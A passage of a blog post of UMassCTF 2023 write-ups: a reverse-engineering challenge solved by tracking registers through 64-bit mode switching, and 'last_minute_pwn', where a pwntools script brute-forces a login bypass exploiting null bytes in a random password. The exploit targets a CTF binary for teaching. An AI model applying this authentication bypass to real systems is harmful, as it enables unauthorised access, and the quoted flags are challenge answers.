    <span class="k">if</span> <span class="p">(</span><span class="n">cmp</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">flag</span><span class="p">[</span><span class="n">str_len</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'}'</span> <span class="o">&amp;&amp;</span> <span class="mi">6</span> <span class="o">&lt;</span> <span class="n">str_len</span> <span class="o">&amp;&amp;</span>
            <span class="p">(</span><span class="n">ret</span> <span class="o">=</span> <span class="n">check_fun</span><span class="p">(</span><span class="n">flag</span><span class="o">+</span><span class="mi">6</span><span class="p">,</span> <span class="n">str_len</span><span class="o">-</span><span class="mi">7</span><span class="p">),</span> <span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"You have found flag!"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"no"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">check_fun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">flag</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">volatile</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span>
    <span class="n">code_ptr</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span>
            <span class="nb">NULL</span><span class="p">,</span>
            <span class="mh">0xb2</span><span class="p">,</span>
            <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span>
            <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span>
            <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
            <span class="mi">0</span>
    <span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">code_ptr</span><span class="p">,</span> <span class="n">orig_code</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">);</span>
    <span class="n">mprotect</span><span class="p">(</span><span class="n">code_ptr</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_EXEC</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">);</span>

    <span class="kt">char</span><span class="o">*</span> <span class="n">bytes</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">code_ptr</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mi">10</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)(</span><span class="n">bytes</span> <span class="o">+</span> <span class="mh">0x3e</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mh">0x3f</span><span class="p">)</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mh">0x4c</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">flag</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="mi">0</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mh">0x56</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)(</span><span class="n">bytes</span> <span class="o">+</span> <span class="mh">0xf</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mh">0x5a</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="mi">0</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mh">0x9d</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ret</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mh">0xa1</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ret</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">bytes</span><span class="o">+</span><span class="mh">0xab</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">bytes</span> <span class="o">+</span> <span class="mh">0xb1</span><span class="p">;</span>
    <span class="n">code_ptr</span><span class="p">();</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>I think I made a mistake somewhere because it segfaults, but it does it just
after the flag is checked so it’s good enough to work with. Just after jumping
to the code that’s the beginning of the disassembly that we get:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0xf7fc0000    push   3
   0xf7fc0002    pop    eax
   0xf7fc0003    shl    eax, 4
   0xf7fc0006    add    al, 3
   0xf7fc0008    push   eax
   0xf7fc0009    push   0xf7fc003e
   0xf7fc000e    retf
</code></pre></div></div>

<p>it changes the eax register to equal 0x33 and then it does a retf to an address
we overwrote in the check_fun function before. It’s important to know how the
retf and far jmps instructions work because if you didn’t know about this it
can be a real headache. Basically if we push 0x23 or 0x33 before the address,
then after retf the value is used in some internal processor’s register and in
this case we change from 32-bit mode to 64-bit mode. Every instruction after
that will be treated as an 64-bit instruction by the processor. The main problem
is that gdb doesn’t work well with this kind of hackery so after that gdb still
thinks that it’s executing 32-bit code. It’s annoying if you don’t notice it
because then gdb looks like it’s broken. For example you step one instruction
but gdb steps three instructions. To be honest I don’t know a way to change it
so after that happens I just observe how registers change. </p>

<p>Because of that I couldn’t depend on the gdb disassembly to solve the
challenge. That may be a little anticlimactic ending cause I don’t have any
pretty pictures to show but basically I solved it by observing how register
values change and noticing that my input letters are xored with some value and
then are loaded to the eax register and then checked if they are zero. So if
they weren’t zero but instead were equal to 0x20 for example then I xored my
input letter with 0x20 and I did it like that for every letter in the input.
Before the xoring part there was also a length check to check if the flag has
the correct length. I’m sure it could be automated in some way but doing it by
hand took me around 30~ minutes so it wasn’t that bad. ;)</p>

<p>There’s the flag: <code class="language-plaintext highlighter-rouge">UMASS{Y0U^V3_4N5W3R3D_TH3_H34V3N^5_C411!__EHBFKhLUVig}</code></p>

<h1 id="last_minute_pwn">last_minute_pwn</h1>
<blockquote>
  <p>Idk, 1 pwn seemed kinda low so here’s another</p>
</blockquote>

<p>We are given a 64-bit linux binary. The binary doesn’t have any stack canaries
according to checksec but this fact won’t be needed, it will turn out there are
no stack buffer overflows to abuse. I can proudly say I got both a first blood
and an unintended in this challenge, that’s always something! :D</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  last file ./last_minute_pwn
./last_minute_pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=351ccad1d89b2c1e96ac2ce97fa96a9574b521de, for GNU/Linux 3.2.0, not stripped
➜  last checksec ./last_minute_pwn
[*] '/home/tabun-dareka/umass/last/last_minute_pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div></div>

<p>Before opening up Ghidra we can poke at the program by running it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  last ./last_minute_pwn

.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
	~ 1 Launch Game ~
	~ 2 Edit config ~
	~ 3 Exit        ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 &gt;&gt; 3
Shutting Off...
➜  last ./last_minute_pwn

.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
	~ 1 Launch Game ~
	~ 2 Edit config ~
	~ 3 Exit        ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 &gt;&gt; 2
Please authenticate to access the configs
Enter password
 &gt;&gt; testtest
Login failed

.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
	~ 1 Launch Game ~
	~ 2 Edit config ~
	~ 3 Exit        ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 &gt;&gt; 1
</code></pre></div></div>

<p>So we get a menu with three options. One just exists, the second one asks us
for a password (Maybe if we get the password right we get the flag? Or maybe
the password is the flag?) and the first one launches a simple terminal math
game. If we launch the game we are asked if we’re ready. <code class="language-plaintext highlighter-rouge">n</code> just goes back to
the previous menu and <code class="language-plaintext highlighter-rouge">y</code> goes to a next menu.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Are you ready for the ultimate math game? [y/n]
 &gt;&gt; n

.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
	~ 1 Launch Game ~
	~ 2 Edit config ~
	~ 3 Exit        ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 &gt;&gt; 1
Are you ready for the ultimate math game? [y/n]
 &gt;&gt; y
.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
    ~ 1 Answer a question ~
    ~ 2 Print Answers     ~
    ~ 3 Start a new game  ~
    ~ 4 End Game          ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 &gt;&gt;
</code></pre></div></div>

<p>By poking a little more at the program we can see that the options do what they
say, so let’s already go to Ghidra. This is the main function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">password</span> <span class="o">=</span> <span class="n">get_admin_pass</span><span class="p">();</span>
  <span class="n">run</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">password</code> is a global variable that stores a pointer that points to well… a
password. This is how it’s generated:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="o">*</span> <span class="nf">get_admin_pass</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
  
  <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x14</span><span class="p">);</span>
  <span class="n">__stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">__s</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
  <span class="n">__s</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
  <span class="n">fclose</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__s</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It’s just random bytes. Including bytes like nullbytes. Keep it in mind cause
it may be important. ;)</p>

<p>This is how the first main menu function looks like:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">run</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar1</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">local_14</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="n">uint</span> <span class="n">option</span><span class="p">;</span>
  
  <span class="k">do</span> <span class="p">{</span>
    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
      <span class="n">print_main_menu</span><span class="p">();</span>
      <span class="n">pcVar1</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">local_14</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">pcVar1</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">option</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">local_14</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Shutting Off..."</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
<span class="nl">LAB_00101a50:</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Unrecognized Option"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">game</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_00101a50</span><span class="p">;</span>
      <span class="n">config</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Nothing too see there, so let’s go straight away to the config function and
let’s check how the password is checked.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">config</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">bool</span> <span class="n">bVar1</span><span class="p">;</span>
  <span class="n">undefined7</span> <span class="n">extraout_var</span><span class="p">;</span>
  
  <span class="n">puts</span><span class="p">(</span><span class="s">"Please authenticate to access the configs"</span><span class="p">);</span>
  <span class="n">bVar1</span> <span class="o">=</span> <span class="n">authenticate_admin</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">CONCAT71</span><span class="p">(</span><span class="n">extraout_var</span><span class="p">,</span><span class="n">bVar1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Login failed"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Login Successful, here are the creds"</span><span class="p">);</span>
    <span class="n">print_flag</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">bool</span> <span class="nf">authenticate_admin</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar2</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">sVar3</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_638</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_630</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  
  <span class="n">local_630</span> <span class="o">=</span> <span class="n">password</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
  <span class="n">local_638</span> <span class="o">=</span> <span class="o">*</span><span class="n">password</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter password"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">" &gt;&gt; "</span><span class="p">);</span>
  <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">pcVar2</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">local_28</span><span class="p">[</span><span class="n">sVar3</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">local_28</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_638</span><span class="p">,</span><span class="mh">0xe</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now we can see that if we get the password right we get a flag. Look closely at
the <code class="language-plaintext highlighter-rouge">authenticate_admin</code> function and try to find the unintended solution. The
trick is to know that strcmp type of functions stop comparing when they
encouter a nullbyte because they are designed for c-style strings. If our input
is just a newline then it gets overwritten as a nullbyte because of the lines:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">local_28</span><span class="p">[</span><span class="n">sVar3</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
</code></pre></div></div>

<p>Now we just need a nullbyte at the beginning of the random password. It’s a
simple bruteforce that shouldn’t take too much time because we only pray for a
single byte to equal zero. There’s my solve.py script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./last_minute_pwn_patched"</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>


<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
            <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"last_minute_pwn.pwn.umasscybersec.org"</span><span class="p">,</span> <span class="mi">7293</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">r</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">''</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Login '</span><span class="p">)</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'f'</span><span class="p">:</span>
            <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">continue</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>…aaaand we get the flag: <code class="language-plaintext highlighter-rouge">UMASSCTF{todo:_think_of_a_creative_flag}</code> .</p>

<p>Now about the intended solution. I haven’t tested it myself but I spoke with
the admin/author about it. By answering neither <code class="language-plaintext highlighter-rouge">y</code> nor <code class="language-plaintext highlighter-rouge">n</code> to the question if
you’re ready, you can get a stack leak. According to him the intended solution
was to recursively call the game through the restart option to shift the stack
frame over the area where the password was written to the stack and then leak
it using the “Print Answers” option from the second menu. The password appears
on the stack after using the second option from the first menu.</p>

  </div><a class="u-url" href="/ctf/rev/pwn/c/2023/03/28/UmassCTF-Writeups.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">poni&#39;s blog</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">poni&#39;s blog</li><li><a class="u-email" href="mailto:poniponiponiponiponiponiponiponiponiponi@protonmail.com">poniponiponiponiponiponiponiponiponiponi@protonmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/poniponiponiponiponiponiponiponiponi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">poniponiponiponiponiponiponiponiponi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>My tech blog where I write about things I find interesting. Mostly low level programming, linux and ctf competitions.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
